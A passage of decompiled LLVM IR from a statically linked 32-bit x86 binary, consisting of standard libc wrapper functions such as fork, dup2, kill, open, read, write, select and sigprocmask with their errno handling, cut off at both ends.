  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e2fc = load i32, i32* @ebx, align 4
  store i32 %v0_804e2fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804e30f = call i32 @dup2(i32 %v0_804e2fc, i32 %tmp4)
  store i32 %v2_804e30f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e30f, -4095
  br i1 %tmp, label %dec_label_pc_804e328, label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %entry
  %v0_804e31c = load i32, i32* %stack_var_-4, align 4
  %v1_804e31c = call i32 @__errno_location(i32 %v0_804e31c)
  %v0_804e321 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e321 = sub i32 0, %v0_804e321
  %v2_804e323 = inttoptr i32 %v1_804e31c to i32*
  store i32 %v1_804e321, i32* %v2_804e323, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e328

dec_label_pc_804e328:                             ; preds = %entry, %dec_label_pc_804e31c
  %v0_804e329 = phi i32 [ %v2_804e30f, %entry ], [ -1, %dec_label_pc_804e31c ]
  %v2_804e32c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e32c, i32* @ebx, align 4
  ret i32 %v0_804e329

; uselistorder directives
  uselistorder i32 %v2_804e30f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e328, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e330 = load i32, i32* @ebx, align 4
  store i32 %v0_804e330, i32* %stack_var_-4, align 4
  %v1_804e339 = call i32 @fork(i32 %v0_804e330)
  store i32 %v1_804e339, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e339, -4095
  br i1 %tmp, label %dec_label_pc_804e350, label %dec_label_pc_804e344

dec_label_pc_804e344:                             ; preds = %entry
  %v0_804e344 = load i32, i32* %stack_var_-4, align 4
  %v1_804e344 = call i32 @__errno_location(i32 %v0_804e344)
  %v0_804e349 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e349 = sub i32 0, %v0_804e349
  %v2_804e34b = inttoptr i32 %v1_804e344 to i32*
  store i32 %v1_804e349, i32* %v2_804e34b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e350

dec_label_pc_804e350:                             ; preds = %entry, %dec_label_pc_804e344
  %v0_804e351 = phi i32 [ %v1_804e339, %entry ], [ -1, %dec_label_pc_804e344 ]
  %v2_804e350 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e350, i32* @edx, align 4
  %v2_804e354 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e354, i32* @ebx, align 4
  ret i32 %v0_804e351

; uselistorder directives
  uselistorder i32 %v1_804e339, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e350, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804e35b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804e362 = call i32 @getrlimit(i32 7, i32 %v2_804e35b)
  store i32 256, i32* @edx, align 4
  %v2_804e36f = icmp slt i32 %v2_804e362, 0
  br i1 %v2_804e36f, label %dec_label_pc_804e377, label %dec_label_pc_804e373

dec_label_pc_804e373:                             ; preds = %entry
  %v3_804e373 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804e373, i32* @edx, align 4
  br label %dec_label_pc_804e377

dec_label_pc_804e377:                             ; preds = %entry, %dec_label_pc_804e373
  %v0_804e377 = phi i32 [ 256, %entry ], [ %v3_804e373, %dec_label_pc_804e373 ]
  ret i32 %v0_804e377

; uselistorder directives
  uselistorder label %dec_label_pc_804e377, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e380 = load i32, i32* @ebx, align 4
  store i32 %v0_804e380, i32* %stack_var_-4, align 4
  %v1_804e389 = call i32 @getpid(i32 %v0_804e380)
  store i32 %v1_804e389, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e389, -4095
  br i1 %tmp, label %dec_label_pc_804e3a0, label %dec_label_pc_804e394

dec_label_pc_804e394:                             ; preds = %entry
  %v0_804e394 = load i32, i32* %stack_var_-4, align 4
  %v1_804e394 = call i32 @__errno_location(i32 %v0_804e394)
  %v0_804e399 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e399 = sub i32 0, %v0_804e399
  %v2_804e39b = inttoptr i32 %v1_804e394 to i32*
  store i32 %v1_804e399, i32* %v2_804e39b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e3a0

dec_label_pc_804e3a0:                             ; preds = %entry, %dec_label_pc_804e394
  %v0_804e3a1 = phi i32 [ %v1_804e389, %entry ], [ -1, %dec_label_pc_804e394 ]
  %v2_804e3a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e3a4, i32* @ebx, align 4
  ret i32 %v0_804e3a1

; uselistorder directives
  uselistorder i32 %v1_804e389, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e3a0, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e3a8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804e3bb = call i32 @int80_syscall(i32 191)
  store i32 %v1_804e3bb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e3bb, -4095
  br i1 %tmp, label %dec_label_pc_804e3d4, label %dec_label_pc_804e3c8

dec_label_pc_804e3c8:                             ; preds = %entry
  %v0_804e3c8 = load i32, i32* %stack_var_-4, align 4
  %v1_804e3c8 = call i32 @__errno_location(i32 %v0_804e3c8)
  %v0_804e3cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e3cd = sub i32 0, %v0_804e3cd
  %v2_804e3cf = inttoptr i32 %v1_804e3c8 to i32*
  store i32 %v1_804e3cd, i32* %v2_804e3cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e3d4

dec_label_pc_804e3d4:                             ; preds = %entry, %dec_label_pc_804e3c8
  %v0_804e3d5 = phi i32 [ %v1_804e3bb, %entry ], [ -1, %dec_label_pc_804e3c8 ]
  %v2_804e3d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e3d8, i32* @ebx, align 4
  ret i32 %v0_804e3d5

; uselistorder directives
  uselistorder i32 %v1_804e3bb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e3d4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e3dc = load i32, i32* @edi, align 4
  store i32 %v0_804e3dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804e3f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e3fc = call i32 @ioctl(i32 %v0_804e3f4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804e3f4, i32* @ebx, align 4
  store i32 %v3_804e3fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804e3fc, -4095
  br i1 %tmp, label %dec_label_pc_804e414, label %dec_label_pc_804e408

dec_label_pc_804e408:                             ; preds = %entry
  %v1_804e408 = call i32 @__errno_location(i32 %v0_804e3f4)
  %v0_804e40d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e40d = sub i32 0, %v0_804e40d
  %v2_804e40f = inttoptr i32 %v1_804e408 to i32*
  store i32 %v1_804e40d, i32* %v2_804e40f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e414

dec_label_pc_804e414:                             ; preds = %entry, %dec_label_pc_804e408
  %v0_804e417 = phi i32 [ %v3_804e3fc, %entry ], [ -1, %dec_label_pc_804e408 ]
  %v2_804e419 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e419, i32* @edi, align 4
  ret i32 %v0_804e417

; uselistorder directives
  uselistorder i32 %v3_804e3fc, { 1, 0, 2 }
  uselistorder i32 %v0_804e3f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e414, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e41c = load i32, i32* @ebx, align 4
  store i32 %v0_804e41c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804e42f = call i32 @kill(i32 %v0_804e41c, i32 %tmp4)
  store i32 %v2_804e42f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e42f, -4095
  br i1 %tmp, label %dec_label_pc_804e448, label %dec_label_pc_804e43c

dec_label_pc_804e43c:                             ; preds = %entry
  %v0_804e43c = load i32, i32* %stack_var_-4, align 4
  %v1_804e43c = call i32 @__errno_location(i32 %v0_804e43c)
  %v0_804e441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e441 = sub i32 0, %v0_804e441
  %v2_804e443 = inttoptr i32 %v1_804e43c to i32*
  store i32 %v1_804e441, i32* %v2_804e443, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e448

dec_label_pc_804e448:                             ; preds = %entry, %dec_label_pc_804e43c
  %v0_804e449 = phi i32 [ %v2_804e42f, %entry ], [ -1, %dec_label_pc_804e43c ]
  %v2_804e448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e448, i32* @edx, align 4
  %v2_804e44c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e44c, i32* @ebx, align 4
  ret i32 %v0_804e449

; uselistorder directives
  uselistorder i32 %v2_804e42f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e448, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804e453 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804e457 = sdiv i32 %sext, 16777216
  %v4_804e45b = ptrtoint i8* %arg1 to i32
  %v3_804e45f = and i32 %arg2, 64
  %v4_804e45f = icmp eq i32 %v3_804e45f, 0
  br i1 %v4_804e45f, label %dec_label_pc_804e470, label %dec_label_pc_804e464

dec_label_pc_804e464:                             ; preds = %entry
  br label %dec_label_pc_804e470

dec_label_pc_804e470:                             ; preds = %entry, %dec_label_pc_804e464
  store i32 %v4_804e45b, i32* %ebx.global-to-local, align 4
  %v5_804e47b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804e457)
  store i32 %v5_804e47b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804e47b, -4095
  br i1 %tmp, label %dec_label_pc_804e493, label %dec_label_pc_804e487

dec_label_pc_804e487:                             ; preds = %dec_label_pc_804e470
  %v1_804e487 = call i32 @__errno_location(i32 %v0_804e453)
  %v0_804e48c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e48c = sub i32 0, %v0_804e48c
  %v2_804e48e = inttoptr i32 %v1_804e487 to i32*
  store i32 %v1_804e48c, i32* %v2_804e48e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e493

dec_label_pc_804e493:                             ; preds = %dec_label_pc_804e470, %dec_label_pc_804e487
  %v0_804e496 = phi i32 [ %v5_804e47b, %dec_label_pc_804e470 ], [ -1, %dec_label_pc_804e487 ]
  store i32 %v0_804e453, i32* @ebx, align 4
  ret i32 %v0_804e496

; uselistorder directives
  uselistorder i32 %v5_804e47b, { 1, 0, 2 }
  uselistorder i32 %v0_804e453, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e493, { 1, 0 }
  uselistorder label %dec_label_pc_804e470, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804e4ab = inttoptr i32 %arg1 to i8*
  %v4_804e4ab = call i32 @__libc_open(i8* %v3_804e4ab, i32 577)
  ret i32 %v4_804e4ab
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e4b4 = load i32, i32* @edi, align 4
  store i32 %v0_804e4b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e4bc = load i32, i32* @ebx, align 4
  %v1_804e4c4 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804e4c4 = call i32 @pipe([2 x i32] %v1_804e4c4)
  store i32 %v0_804e4bc, i32* @ebx, align 4
  store i32 %v2_804e4c4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e4c4, -4095
  br i1 %tmp, label %dec_label_pc_804e4dc, label %dec_label_pc_804e4d0

dec_label_pc_804e4d0:                             ; preds = %entry
  %v1_804e4d0 = call i32 @__errno_location(i32 %v0_804e4bc)
  %v0_804e4d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e4d5 = sub i32 0, %v0_804e4d5
  %v2_804e4d7 = inttoptr i32 %v1_804e4d0 to i32*
  store i32 %v1_804e4d5, i32* %v2_804e4d7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e4dc

dec_label_pc_804e4dc:                             ; preds = %entry, %dec_label_pc_804e4d0
  %v0_804e4dd = phi i32 [ %v2_804e4c4, %entry ], [ -1, %dec_label_pc_804e4d0 ]
  %v2_804e4e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e4e0, i32* @edi, align 4
  ret i32 %v0_804e4dd

; uselistorder directives
  uselistorder i32 %v2_804e4c4, { 1, 0, 2 }
  uselistorder i32 %v0_804e4bc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e4dc, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e4e4 = load i32, i32* @edi, align 4
  store i32 %v0_804e4e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e4f4 = load i32, i32* @ebx, align 4
  %v4_804e4fc = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e4f4, i32* @ebx, align 4
  store i32 %v4_804e4fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e4fc, -4095
  br i1 %tmp, label %dec_label_pc_804e514, label %dec_label_pc_804e508

dec_label_pc_804e508:                             ; preds = %entry
  %v1_804e508 = call i32 @__errno_location(i32 %v0_804e4f4)
  %v0_804e50d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e50d = sub i32 0, %v0_804e50d
  %v2_804e50f = inttoptr i32 %v1_804e508 to i32*
  store i32 %v1_804e50d, i32* %v2_804e50f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e514

dec_label_pc_804e514:                             ; preds = %entry, %dec_label_pc_804e508
  %v0_804e515 = phi i32 [ %v4_804e4fc, %entry ], [ -1, %dec_label_pc_804e508 ]
  %v2_804e518 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e518, i32* @edi, align 4
  ret i32 %v0_804e515

; uselistorder directives
  uselistorder i32 %v4_804e4fc, { 1, 0, 2 }
  uselistorder i32 %v0_804e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e514, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e51d = load i32, i32* @esi, align 4
  store i32 %v0_804e51d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804e535 = load i32, i32* @ebx, align 4
  %v1_804e53d = call i32 @int80_syscall(i32 142)
  store i32 %v0_804e535, i32* @ebx, align 4
  store i32 %v1_804e53d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e53d, -4095
  br i1 %tmp, label %dec_label_pc_804e555, label %dec_label_pc_804e549

dec_label_pc_804e549:                             ; preds = %entry
  %v1_804e549 = call i32 @__errno_location(i32 %v0_804e535)
  %v0_804e54e = load i32, i32* %esi.global-to-local, align 4
  %v1_804e54e = sub i32 0, %v0_804e54e
  %v2_804e550 = inttoptr i32 %v1_804e549 to i32*
  store i32 %v1_804e54e, i32* %v2_804e550, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e555

dec_label_pc_804e555:                             ; preds = %entry, %dec_label_pc_804e549
  %v0_804e556 = phi i32 [ %v1_804e53d, %entry ], [ -1, %dec_label_pc_804e549 ]
  %v2_804e558 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e558, i32* @esi, align 4
  ret i32 %v0_804e556

; uselistorder directives
  uselistorder i32 %v1_804e53d, { 1, 0, 2 }
  uselistorder i32 %v0_804e535, { 1, 0 }
  uselistorder label %dec_label_pc_804e555, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e55c = load i32, i32* @ebx, align 4
  store i32 %v0_804e55c, i32* %stack_var_-4, align 4
  %v1_804e565 = call i32 @setsid(i32 %v0_804e55c)
  store i32 %v1_804e565, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e565, -4095
  br i1 %tmp, label %dec_label_pc_804e57c, label %dec_label_pc_804e570

dec_label_pc_804e570:                             ; preds = %entry
  %v0_804e570 = load i32, i32* %stack_var_-4, align 4
  %v1_804e570 = call i32 @__errno_location(i32 %v0_804e570)
  %v0_804e575 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e575 = sub i32 0, %v0_804e575
  %v2_804e577 = inttoptr i32 %v1_804e570 to i32*
  store i32 %v1_804e575, i32* %v2_804e577, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e57c

dec_label_pc_804e57c:                             ; preds = %entry, %dec_label_pc_804e570
  %v0_804e57d = phi i32 [ %v1_804e565, %entry ], [ -1, %dec_label_pc_804e570 ]
  %v2_804e580 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e580, i32* @ebx, align 4
  ret i32 %v0_804e57d

; uselistorder directives
  uselistorder i32 %v1_804e565, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e57c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e585 = load i32, i32* @esi, align 4
  %v4_804e589 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e589, i32* @ecx, align 4
  %v2_804e595 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e595, label %dec_label_pc_804e5ae, label %dec_label_pc_804e599

dec_label_pc_804e599:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804e5ae, label %dec_label_pc_804e59e

dec_label_pc_804e59e:                             ; preds = %dec_label_pc_804e599
  %v1_804e59e = call i32 @__errno_location(i32 %v0_804e585)
  %v1_804e5a3 = inttoptr i32 %v1_804e59e to i32*
  store i32 22, i32* %v1_804e5a3, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_804e5d5

dec_label_pc_804e5ae:                             ; preds = %dec_label_pc_804e599, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e5b3 = load i32, i32* @ebx, align 4
  %v7_804e5bb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e5b3, i32* @ebx, align 4
  %v1_804e5be = add i32 %v7_804e5bb, 4096
  %v2_804e5be = icmp ult i32 %v7_804e5bb, -4096
  %v3_804e5be = xor i32 %v7_804e5bb, -2147483648
  %v4_804e5be = xor i32 %v1_804e5be, %v7_804e5bb
  %v5_804e5be = and i32 %v4_804e5be, %v3_804e5be
  %v6_804e5be = icmp slt i32 %v5_804e5be, 0
  store i1 %v6_804e5be, i1* @of, align 1
  %v7_804e5be = icmp eq i32 %v1_804e5be, 0
  store i32 %v7_804e5bb, i32* %esi.global-to-local, align 4
  %v2_804e5c5 = or i1 %v2_804e5be, %v7_804e5be
  br i1 %v2_804e5c5, label %dec_label_pc_804e5d5, label %dec_label_pc_804e5c7

dec_label_pc_804e5c7:                             ; preds = %dec_label_pc_804e5ae
  %v1_804e5c7 = call i32 @__errno_location(i32 %v0_804e5b3)
  %v0_804e5cc = load i32, i32* %esi.global-to-local, align 4
  %v1_804e5cc = sub i32 0, %v0_804e5cc
  %v2_804e5ce = inttoptr i32 %v1_804e5c7 to i32*
  store i32 %v1_804e5cc, i32* %v2_804e5ce, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e5d5

dec_label_pc_804e5d5:                             ; preds = %dec_label_pc_804e5c7, %dec_label_pc_804e5ae, %dec_label_pc_804e59e
  %storemerge = phi i32 [ -1, %dec_label_pc_804e59e ], [ %v7_804e5bb, %dec_label_pc_804e5ae ], [ -1, %dec_label_pc_804e5c7 ]
  %v2_804e5d5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e5d5, i32* @edx, align 4
  store i32 %v0_804e585, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e5be, { 1, 0 }
  uselistorder i32 %v7_804e5bb, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_804e5b3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804e5dc = load i32, i32* @edi, align 4
  store i32 %v0_804e5dc, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e5e4 = load i32, i32* @ebx, align 4
  %v2_804e5ec = call i32 @time(i32* %arg1)
  store i32 %v0_804e5e4, i32* @ebx, align 4
  store i32 %v2_804e5ec, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e5ec, -4095
  br i1 %tmp, label %dec_label_pc_804e604, label %dec_label_pc_804e5f8

dec_label_pc_804e5f8:                             ; preds = %entry
  %v1_804e5f8 = call i32 @__errno_location(i32 %v0_804e5e4)
  %v0_804e5fd = load i32, i32* %edi.global-to-local, align 4
  %v1_804e5fd = sub i32 0, %v0_804e5fd
  %v2_804e5ff = inttoptr i32 %v1_804e5f8 to i32*
  store i32 %v1_804e5fd, i32* %v2_804e5ff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e604

dec_label_pc_804e604:                             ; preds = %entry, %dec_label_pc_804e5f8
  %v0_804e605 = phi i32 [ %v2_804e5ec, %entry ], [ -1, %dec_label_pc_804e5f8 ]
  %v2_804e608 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e608, i32* @edi, align 4
  ret i32 %v0_804e605

; uselistorder directives
  uselistorder i32 %v2_804e5ec, { 1, 0, 2 }
  uselistorder i32 %v0_804e5e4, { 1, 0 }
  uselistorder label %dec_label_pc_804e604, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804e61d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804e61d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e628 = load i32, i32* @edi, align 4
  store i32 %v0_804e628, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e638 = load i32, i32* @ebx, align 4
  %v4_804e640 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e638, i32* @ebx, align 4
  store i32 %v4_804e640, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e640, -4095
  br i1 %tmp, label %dec_label_pc_804e658, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %entry
  %v1_804e64c = call i32 @__errno_location(i32 %v0_804e638)
  %v0_804e651 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e651 = sub i32 0, %v0_804e651
  %v2_804e653 = inttoptr i32 %v1_804e64c to i32*
  store i32 %v1_804e651, i32* %v2_804e653, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e658

dec_label_pc_804e658:                             ; preds = %entry, %dec_label_pc_804e64c
  %v0_804e659 = phi i32 [ %v4_804e640, %entry ], [ -1, %dec_label_pc_804e64c ]
  %v2_804e658 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e658, i32* @edx, align 4
  %v2_804e65c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e65c, i32* @edi, align 4
  ret i32 %v0_804e659

; uselistorder directives
  uselistorder i32 %v4_804e640, { 1, 0, 2 }
  uselistorder i32 %v0_804e638, { 1, 0 }
  uselistorder label %dec_label_pc_804e658, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e664 = load i32, i32* inttoptr (i32 134567556 to i32*), align 4
  %v2_804e669 = mul i32 %arg1, 2
  %v3_804e669 = add i32 %v0_804e664, %v2_804e669
  %v4_804e669 = inttoptr i32 %v3_804e669 to i16*
  %v5_804e669 = load i16, i16* %v4_804e669, align 2
  %v6_804e669 = zext i16 %v5_804e669 to i32
  %v1_804e66d = and i32 %v6_804e669, 32
  ret i32 %v1_804e66d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e678 = add i32 %arg1, 128
  %v6_804e683 = icmp ugt i32 %v1_804e678, 383
  br i1 %v6_804e683, label %dec_label_pc_804e68e, label %dec_label_pc_804e685

dec_label_pc_804e685:                             ; preds = %entry
  %v0_804e685 = load i32, i32* inttoptr (i32 134567564 to i32*), align 4
  %v2_804e68a = mul i32 %arg1, 2
  %v3_804e68a = add i32 %v0_804e685, %v2_804e68a
  %v4_804e68a = inttoptr i32 %v3_804e68a to i16*
  %v5_804e68a = load i16, i16* %v4_804e68a, align 2
  %v6_804e68a = sext i16 %v5_804e68a to i32
  store i32 %v6_804e68a, i32* @edx, align 4
  br label %dec_label_pc_804e68e

dec_label_pc_804e68e:                             ; preds = %entry, %dec_label_pc_804e685
  %v0_804e68e = phi i32 [ %arg1, %entry ], [ %v6_804e68a, %dec_label_pc_804e685 ]
  ret i32 %v0_804e68e

; uselistorder directives
  uselistorder label %dec_label_pc_804e68e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805b974.97 to i32)
}

define i32 @puts(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804e69c = load i32, i32* @edi, align 4
  %v0_804e69d = load i32, i32* @esi, align 4
  %v0_804e69e = load i32, i32* @ebx, align 4
  %v12_804e69f = ptrtoint i32* %stack_var_-28 to i32
  %v0_804e6a2 = load i32, i32* inttoptr (i32 134567572 to i32*), align 4
  store i32 %v0_804e6a2, i32* @esi, align 4
  %v1_804e6a8 = add i32 %v0_804e6a2, 52
  %v2_804e6a8 = inttoptr i32 %v1_804e6a8 to i32*
  %v3_804e6a8 = load i32, i32* %v2_804e6a8, align 4
  store i32 %v3_804e6a8, i32* @edi, align 4
  %v1_804e6ab = icmp eq i32 %v3_804e6a8, 0
  %v1_804e6ad = icmp eq i1 %v1_804e6ab, false
